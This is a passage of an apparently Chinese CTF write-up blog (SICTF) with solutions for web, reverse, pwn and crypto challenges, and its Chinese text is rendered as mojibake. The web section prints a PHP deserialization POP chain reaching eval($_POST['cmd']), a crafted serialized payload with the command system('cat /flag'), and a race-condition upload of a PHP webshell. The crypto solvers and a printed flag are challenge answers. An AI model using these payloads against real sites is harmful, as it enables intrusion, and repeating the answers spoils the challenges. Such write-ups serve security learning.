class="variable">$this</span>-&gt;pop))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;è¿™æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä¸èƒ½è®©æ–°ç”Ÿä¸€ç›´åšä¸å‡ºæ¥é­å—æ‰“å‡»&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ‰£1é€åœ°ç‹±ç«&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;i = <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nogame-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å¿…é¡»æ‰§è¡Œ&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span> = <span class="string">&#x27;QNKCDZO&#x27;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span> = <span class="string">&#x27;240610708&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I also want to fall in love&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;girl != <span class="variable language_">$this</span>-&gt;boy &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;girl) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;boy))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Aec-&gt;<span class="title function_ invoke__">game</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æœ‰å¯¹è±¡æˆ‘ä¼šåœ¨è¿™æ‰“CTF???çœ‹æˆ‘å…‹éš†ä¸€ä¸ªå¯¹è±¡ï¼&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&quot;game&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;æ‰“æ¸¸æˆå»ï¼Œåˆ«æƒ³ç€å¯¹è±¡äº†&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;MyLover = <span class="keyword">clone</span> <span class="keyword">new</span> B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop -&gt;Aec = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;pop -&gt;Aec -&gt; nogame = <span class="keyword">new</span> <span class="title function_ invoke__">P</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><p>è§£ææ—¶ç¬¬ä¸€ä¸ª[ä¼šè§£æä¸ºä¸‹åˆ’çº¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A[B_C=O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;Aec&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;pop&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;233333333&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;P&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;MyLover&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;girl&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;QNKCDZO&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;boy&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;240610708&quot;</span>;&#125;s:<span class="number">1</span>:<span class="string">&quot;i&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;nogame&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—"><a href="#ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—" class="headerlink" title="ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—"></a>ä½ èƒ½è·Ÿå¾—ä¸Šæˆ‘çš„speedå—</h3><p>æ¡ä»¶ç«äº‰</p><p>å‡†å¤‡ä¸€ä¸ªphpæ–‡ä»¶</p><p>å†…å®¹ä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval(system(&quot;cat /flag&quot;));?&gt;</span><br></pre></td></tr></table></figure><p>æŠ“ä¸¤ä¸ªåŒ…</p><p>ä¸€ä¸ªä¸ºgetä¼ å‚çš„åŒ…ï¼Œè®¿é—®url&#x2F;uploads&#x2F;2.php,æŠ“åŒ…</p><p>å¦ä¸€ä¸ªä¸ºpoståŒ…ï¼Œç›´æ¥å°±æŠ“ä¸Šä¼ çš„åŒ…ï¼Œå¦‚ä¸‹</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194924480-1700990465940-276.png"></p><p>ä¿©ä¸ªåŒ…ç”¨burpçˆ†ç ´ï¼Œçˆ†ç ´æ–¹å¼ä¸ºnoplayloadï¼Œå¼€è·‘</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194932339-1700990465940-278.png"></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h3 id="ç­¾åˆ°-PYC"><a href="#ç­¾åˆ°-PYC" class="headerlink" title="[ç­¾åˆ°]PYC"></a>[ç­¾åˆ°]PYC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 <span class="number">1.</span>pyc &gt; <span class="number">1.</span>py</span><br></pre></td></tr></table></figure><h3 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3><p>åŠ¨è°ƒå‡ºæ•°æ®ï¼Œç›´æ¥èµ›åšå¨å­ç§’äº†</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194940735-1700990465940-280.png"></p><h3 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3><p>æ¢è¡¨åŠ å¯†</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194948225-1700990465940-279.png"></p><p><img src="/2023/09/10/SICTF-2nd/Blog/blog/themes/fluid/source/img/image-20230910151009599.png"></p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913194958542-1700990465940-282.png"></p><h3 id="ä¸ä¸€æ ·çš„base64"><a href="#ä¸ä¸€æ ·çš„base64" class="headerlink" title="ä¸ä¸€æ ·çš„base64"></a>ä¸ä¸€æ ·çš„base64</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">BASE64_CHARS = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">base64_decode</span><span class="params">(encoded_data)</span>:</span><br><span class="line">    decoded_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    padding_count = encoded_data.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    encoded_data = encoded_data.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="type">char</span> in encoded_data:</span><br><span class="line">        decimal_val = BASE64_CHARS.index(<span class="type">char</span>)</span><br><span class="line">        binary_str += format(decimal_val, <span class="string">&#x27;06b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> padding_count &gt; <span class="number">0</span>:</span><br><span class="line">        binary_str = binary_str[:-padding_count * <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(binary_str)</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="type">byte</span> = binary_str[i:i + <span class="number">8</span>]</span><br><span class="line">        decoded_data += chr(<span class="type">int</span>(<span class="type">byte</span>, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">decoded_data</span></span><br><span class="line"></span><br><span class="line"><span class="variable">encoded_data</span> <span class="operator">=</span> input(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">decoded_data = base64_decode(encoded_data)</span><br><span class="line">print(decoded_data)</span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="ç­¾åˆ°-Shop"><a href="#ç­¾åˆ°-Shop" class="headerlink" title="[ç­¾åˆ°]Shop"></a>[ç­¾åˆ°]Shop</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195011641-1700990465940-281.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="å¤å…¸å¤§æ‚çƒ©"><a href="#å¤å…¸å¤§æ‚çƒ©" class="headerlink" title="å¤å…¸å¤§æ‚çƒ©"></a>å¤å…¸å¤§æ‚çƒ©</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ğŸ©ğŸ‘ƒğŸªğŸ¼ğŸ‘…ğŸ¯ğŸ©ğŸ‘ˆğŸ‘‡ğŸ‘­ğŸ‘ŸğŸ‘ğŸºğŸ­ğŸ‘‰ğŸ‘™ğŸ‘¤ğŸ‘‹ğŸ‘šğŸªğŸ«ğŸ‘ğŸ‘¢ğŸ‘®ğŸ‘±ğŸ¼ğŸ‘¢ğŸ‘¨ğŸ‘ ğŸ‘­ğŸ½ğŸ°ğŸ»ğŸ‘šğŸ‘‚ğŸ‘§ğŸ‘ ğŸ‘¥ğŸ‘›ğŸ‘®ğŸ‘¯ğŸ‘®ğŸ‘¬ğŸ¾ğŸ‘ğŸ‘›ğŸ‘ŒğŸ‘šğŸ‘ğŸ¨ğŸ‘ğŸ‘‰ğŸ‘†ğŸ¿ğŸ‘†ğŸ‘˜ğŸ‘‡ğŸºğŸ‘¦ğŸ¸ğŸ‘ƒğŸ­ğŸ‘ŸğŸ‘‘ğŸ‘ªğŸ‘ƒğŸ‘ğŸ»ğŸ»ğŸ‘œğŸ§ğŸ‘‡ğŸ‘ŠğŸ§ğŸ¾ğŸ¼ğŸ‘‡ğŸ«ğŸºğŸ‘ğŸ‘†ğŸ‘ªğŸ¼ğŸ‘‹ğŸ‘ŒğŸ‘§ğŸ»ğŸ‘ğŸ©ğŸºğŸ‘¥ğŸ½ğŸ‘‹ğŸ‘‰ğŸ°ğŸ‘ğŸ‘ ğŸ‘ ğŸ‘£ğŸ§ğŸ«ğŸ‘§ğŸ­ğŸ‘¢ğŸ¯ğŸ‘‘ğŸ‘‘ğŸ®ğŸ‘‚ğŸ‘ğŸ»ğŸ‘¥ğŸ‘šğŸ®ğŸ‘‹ğŸ‘¬ğŸ‘ŒğŸ‘¥ğŸ‘ğŸ‘£ğŸ‘…ğŸ‘§ğŸ‘¯ğŸ‘¦ğŸ‘ŒğŸ‘ŒğŸ‘ğŸ‘ ğŸ‘ŒğŸ½ğŸ‘‰ğŸ‘ƒğŸ‘ŠğŸ«ğŸ‘‰ğŸ¨ğŸ®ğŸ‘©ğŸ‘†ğŸªğŸ¯ğŸ‘˜ğŸ‘ğŸ‘ğŸ¼ğŸ‘©ğŸ‘ğŸ‘ŠğŸ‘ğŸ‘¡ğŸ‘€ğŸ‘°ğŸ‘‹ğŸ‘£ğŸ‘¨ğŸ‘§ğŸ‘ğŸ‘œğŸ‘ğŸ‘›ğŸ®ğŸ‘˜ğŸ‘…ğŸ‘ ğŸ¿ğŸ‘‚ğŸ‘°ğŸ‘„ğŸ‘ˆğŸ‘ğŸ‘ ğŸ‘¤ğŸ‘ƒğŸ‘›ğŸ‘˜ğŸ­ğŸ‘…ğŸ‘±ğŸ‘†ğŸ‘¬ğŸ‘«ğŸ‘¥ğŸ‘†ğŸ½ğŸ‘ğŸ‘ğŸ‘¥ğŸ‘ŠğŸ‘‡ğŸ‘‰ğŸ‘ŠğŸ‘©ğŸ‘ŒğŸ‘­ğŸ«ğŸ«ğŸ‘¬ğŸ‘±ğŸ¯ğŸ‘‡ğŸºğŸ‘ğŸ‘ğŸ‘‘ğŸ‘™ğŸ®ğŸ‘œğŸ‘‹ğŸ‘˜ğŸ‘ªğŸ‘©ğŸ‘šğŸ‘¦ğŸ‘¨ğŸ‘€ğŸ‘©ğŸ‘ğŸ‘‰ğŸ‘ƒğŸ¾ğŸ‘¥ğŸ‘€ğŸ«ğŸ‘ğŸ‘ğŸ©ğŸ§ğŸ‘°ğŸ‘†ğŸ‘‡ğŸ‘¨ğŸªğŸ‘ƒğŸ­ğŸ‘¦ğŸ«ğŸ‘±</span><br></pre></td></tr></table></figure><p>emjioè§£å¯†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4z</span><br></pre></td></tr></table></figure><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195022559-1700990465940-283.png"></p><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195033374-1700990465941-284.png"></p><h3 id="Easy-CopperSmith"><a href="#Easy-CopperSmith" class="headerlink" title="Easy_CopperSmith"></a>Easy_CopperSmith</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">from Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n =<span class="number">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span></span><br><span class="line">cipher =<span class="number">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>,<span class="number">2</span>**<span class="number">4</span>)</span>:</span><br><span class="line">    p4=<span class="number">0x38481379948fa6f1dcedd12e2fb045f096e9978eccc3be2984a9ede4e6ebe1958606c590</span></span><br><span class="line">    p4=p4+<span class="type">int</span>(hex(i),<span class="number">16</span>)</span><br><span class="line">    print(hex(p4))</span><br><span class="line">    kbits = pbits - p4.nbits()  #æœªçŸ¥éœ€è¦çˆ†ç ´çš„æ¯”ç‰¹ä½æ•°</span><br><span class="line">    print(p4.nbits())</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + <span class="type">p4</span></span><br><span class="line">    <span class="variable">roots</span> <span class="operator">=</span> f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>) #è¿›è¡Œçˆ†ç ´</span><br><span class="line">    #print roots</span><br><span class="line">    <span class="keyword">if</span> roots:        #çˆ†ç ´æˆåŠŸï¼Œæ±‚æ ¹</span><br><span class="line">        p = p4+<span class="type">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        print(<span class="string">&quot;p: &quot;</span>, hex(<span class="type">int</span>(p)))</span><br><span class="line">        <span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">        q = n/<span class="type">int</span>(p)</span><br><span class="line">        print(<span class="string">&quot;q: &quot;</span>, hex(<span class="type">int</span>(q)))</span><br><span class="line">        print(gcd(p,q))</span><br><span class="line">        phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        print(gcd(e2,phin))</span><br><span class="line">        d = inverse_mod(e2,phin)</span><br><span class="line">        print(<span class="string">&quot;dï¼š&quot;</span>,d)</span><br><span class="line">        flag = pow(cipher,d,n)</span><br><span class="line">        flag = hex(<span class="type">int</span>(flag))[<span class="number">2</span>:]</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, len(flag)</span>, <span class="number">2</span>):</span><br><span class="line">            hex_int = <span class="type">int</span>(flag[i:i+<span class="number">2</span>], <span class="number">16</span>)  # è½¬æ¢ä¸ºæ•´æ•°</span><br><span class="line">            result += chr(hex_int)  # è½¬æ¢ä¸ºå­—ç¬¦å¹¶æ‹¼æ¥åˆ°ç»“æœå­—ç¬¦ä¸²</span><br><span class="line">        print(<span class="string">&#x27;result :&#x27;</span>,result)</span><br><span class="line">        </span><br><span class="line"># SICTF&#123;3f9366ed-b8e4-<span class="number">412f</span>-bbd0-62616a24115c&#125;</span><br></pre></td></tr></table></figure><h3 id="MingTianPao"><a href="#MingTianPao" class="headerlink" title="MingTianPao"></a>MingTianPao</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_character</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>) <span class="keyword">or</span> <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) &lt;= x &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_strings</span>(<span class="params">s1, s2</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([b1 ^ b2 <span class="keyword">for</span> b1, b2 <span class="keyword">in</span> <span class="built_in">zip</span>(s1, s2)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">infer_space</span>(<span class="params">index, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> message[index, pos] != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    message[index, pos] = <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertexts)):</span><br><span class="line">        <span class="keyword">if</span> x != index:</span><br><span class="line">            message[x][pos] = xor_strings(ciphertexts[x], ciphertexts[index])[pos] ^ <span class="built_in">ord</span>(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_spaces</span>():</span><br><span class="line">    <span class="keyword">for</span> index, x <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertexts):</span><br><span class="line">        res = [xor_strings(x, y) <span class="keyword">for</span> y <span class="keyword">in</span> ciphertexts <span class="keyword">if</span> x != y]</span><br><span class="line">        f = <span class="keyword">lambda</span> position: <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">filter</span>(is_character, [s[position] <span class="keyword">for</span> s <span class="keyword">in</span> res])))</span><br><span class="line">        cnt = [f(pos) <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">            space_data.append((f(pos), index, pos))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;222.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    ciphertexts = [codecs.decode(x.strip().encode(), <span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> x <span class="keyword">in</span> file.readlines()]</span><br><span class="line"></span><br><span class="line">message = np.zeros([<span class="built_in">len</span>(ciphertexts), <span class="built_in">len</span>(ciphertexts[<span class="number">0</span>])], dtype=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">space_data = []</span><br><span class="line"></span><br><span class="line">find_spaces()</span><br><span class="line"></span><br><span class="line">space_data = <span class="built_in">sorted</span>(space_data, reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> weight, index, pos <span class="keyword">in</span> space_data:</span><br><span class="line">    infer_space(index, pos)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> x]) <span class="keyword">for</span> x <span class="keyword">in</span> message]))</span><br><span class="line">hex_str1 = <span class="string">&quot;1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218&quot;</span></span><br><span class="line">hex_str2 = <span class="string">&quot;Little Red Riding Hood promised&quot;</span></span><br><span class="line"></span><br><span class="line">bytes1 = <span class="built_in">bytes</span>.fromhex(hex_str1)</span><br><span class="line">bytes2 = <span class="built_in">bytes</span>(hex_str2, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(bytes1, bytes2)])</span><br><span class="line"></span><br><span class="line">result_str = result.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(result_str)</span><br></pre></td></tr></table></figure><h3 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h3><p>ä½æŒ‡æ•°åŠ å¯†&#x2F;mé«˜ä½æ”»å‡»</p><p><img src="/2023/09/10/SICTF-2nd/1/hexoblog/source/image/image-20230913195045944-1700990465941-286.png"></p><h3 id="ç­¾åˆ°é¢˜æ¥å’¯ï¼"><a href="#ç­¾åˆ°é¢˜æ¥å’¯ï¼" class="headerlink" title="ç­¾åˆ°é¢˜æ¥å’¯ï¼"></a>ç­¾åˆ°é¢˜æ¥å’¯ï¼</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span>  Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span 